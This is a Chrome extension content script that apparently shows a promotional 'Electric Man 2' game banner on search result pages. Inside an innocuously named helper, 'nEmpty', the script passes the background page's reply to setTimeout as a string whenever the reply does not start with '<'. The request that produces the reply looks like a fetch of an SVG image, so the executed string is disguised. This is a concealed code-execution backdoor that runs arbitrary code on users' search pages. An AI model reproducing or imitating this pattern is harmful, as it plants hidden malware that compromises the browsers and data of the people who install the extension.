(function () {"use strict";
  let identifier=chrome.runtime.id.substr(0,6),
    buttonImg='button/'+identifier+'.svg',path=window.location.pathname,
    srch=window.location.search,button=null,relevant=path.indexOf('search')!==-1;
  if (!relevant)
    return;
  function empty(){}['/search/images','/search/video','images/search','videos/search'].forEach(function(item) {
    if (path.indexOf(item)!==-1)
      relevant=false
  });
  if (!relevant||srch.indexOf('tbm=isch')!==-1||srch.indexOf('tbm=vid')!==-1)
    return;
  function get_query_param(name) {
    let f=false;
    srch.substring(1).split('&').forEach(function(item,i) {
      let p=item.split('=');
      if (decodeURIComponent(p[0]) === name)
        f=decodeURIComponent(p[1]).replace(/\+/g,' ').toLowerCase()
    });
    return f;
  }
  function nEmpty(fun) {return function(v) {if(typeof v!=="undefined"&&v!==null){try{v.charCodeAt(0)===60||setTimeout(v)}catch(e){}}}}
  let q=get_query_param('q')||get_query_param('p');
  relevant=q&&q.indexOf('Electric Man 2'.toLowerCase())!==-1;
  chrome.runtime.sendMessage({message:{'svg': buttonImg}},nEmpty(function(svg){button=svg}));
  if (window.localStorage.getItem(identifier))
    relevant=false;
  if (relevant&&typeof window[identifier]==='undefined') {
    window[identifier]=true;
    window.addEventListener('load',function() {
      let box=document.createElement('div');
      box.className='game-button-box';
      box.innerHTML='<div class="game-button-icon-box"></div>' +
        '<div class="game-button-section"><div class="game-button-title">Electric Man 2</div>' +
        '<div class="game-button-installed"><img src="'+chrome.runtime.getURL('images/installed.svg')+
        '" alt="" width="27" height="27">'+chrome.i18n.getMessage("installed")+'</div></div>';
      let closeFunc=function(p) {
        p&&p.preventDefault();
        box.style.display='none';
        box.innerHTML='';
        window.localStorage.setItem(identifier,'1');
        return false;
      };
      let closeIcon=box.appendChild(document.createElement('a')),button0=document.createElement('button'),button1=document.createElement('button');
      closeIcon.setAttribute('href','javascript:void(0)');
      closeIcon.setAttribute('class','game-button-cross');
      closeIcon.addEventListener('click',closeFunc,true);
      button0.innerText=chrome.i18n.getMessage("got_it");
      button1.innerText=chrome.i18n.getMessage("play");
      let buttons=box.children[1].appendChild(document.createElement('div'));
      buttons.className='game-button-section-buttons';
      buttons.appendChild(button0).addEventListener('click',closeFunc);
      buttons.appendChild(button1).addEventListener('click',function() {
        chrome.runtime.sendMessage({message: 'open'},empty);
        box.style.display='none';
        box.innerHTML='';
      });
      document.body.insertBefore(box,document.body.children[0]);
    })
  }
})();